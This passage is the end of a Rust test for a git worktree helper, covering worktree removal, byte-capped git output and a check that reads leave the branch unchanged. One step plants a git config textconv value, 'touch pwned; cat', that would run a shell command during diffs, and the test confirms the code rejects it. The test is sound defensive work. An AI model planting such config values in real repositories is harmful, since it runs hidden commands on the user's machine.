        std::fs::remove_file(worktree.join("scratch.txt")).unwrap();
        assert!(remove_worktree(&ws).unwrap());
        ws.removed_at = Some(2);
        check(&ws);
        g(&repo, &["config", "diff.pwn.textconv", "touch pwned; cat"]);
        let error = branch_commits(&ws).unwrap_err();
        assert!(error.to_string().contains("diff.pwn.textconv"), "{error}");
        g(&repo, &["config", "--unset", "diff.pwn.textconv"]);
        // Output past the byte cap stops git and comes back cut, not as an error.
        let (head, cut_short) = run_capped("git", &repo, &["log", "-p", "--all"], 16).unwrap();
        assert!(cut_short);
        assert_eq!(head.len(), 16);
        // Reads never check anything out: the checkout is still on its own branch.
        assert_eq!(current_branch(&repo).as_deref(), Some("main"));

        let _ = std::fs::remove_dir_all(&base);
    }
}
